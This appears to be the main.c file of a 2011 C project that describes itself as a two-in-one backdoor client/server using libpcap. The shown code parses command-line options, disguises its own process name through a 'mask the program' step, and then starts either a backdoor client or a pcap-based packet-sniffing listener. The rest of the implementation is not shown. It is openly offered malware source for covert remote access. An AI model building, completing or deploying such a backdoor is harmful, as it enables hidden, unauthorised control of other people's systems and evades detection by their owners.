/*
SOURCE FILE: main.c

PROGRAM: Backdoor - A simple two in one backdoor client/server using libpcap

DATE: October 23, 2011

REVISIONS:
	1.0 - October 23

DESIGNERS:
	Santana Mach and Steve Stanisic

PROGRAMMERS:
	Santana Mach and Steve Stanisic

NOTES: See the program help for usage instructions and the attached
  report for program design notes.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#include "capture.h"
#include "client.h"
#include "defs.h"
#include "mask.h"
#include "util.h"

int main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind, optopt;
	int c;
	int client = 0;
	int duplex = 0;
	char ipaddr[MAX_LEN];
	int port = DEF_PRT;
	
	strncpy(ipaddr, DEF_ADR, MAX_LEN);

	while ((c = getopt(argc, argv, ":csdhi:p:")) != -1) 
	{
		switch(c) 
		{
			case 'c':
				client = 1;
				break;
			case 's':
				client = 0;
				break;
			case 'd':
				duplex = 1;
				break;
			case 'i':
				strncpy(ipaddr, optarg, MAX_LEN); 
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'h':
				usage(argv[0]);
				break;
			case ':': // Missing operand.
				fprintf(stderr, "-%c requires an operand.\n", optopt);
				usage(argv[0]);
				break;
			case '?': // Unrecognized option
				fprintf(stderr, "-%c is not a recognized option.\n", optopt);
				usage(argv[0]);
				break;
		}
	}

	// Mask the program
	maskprog(argv[0]);

	if (client)
		backdoor_client(ipaddr, port, duplex);
	else
	{
		if (optind == argc)
			pcap_init(DEF_FLT);
		else
			pcap_init(argv[optind]);

		srv_listen(duplex);
	}
	
	return 0;
}

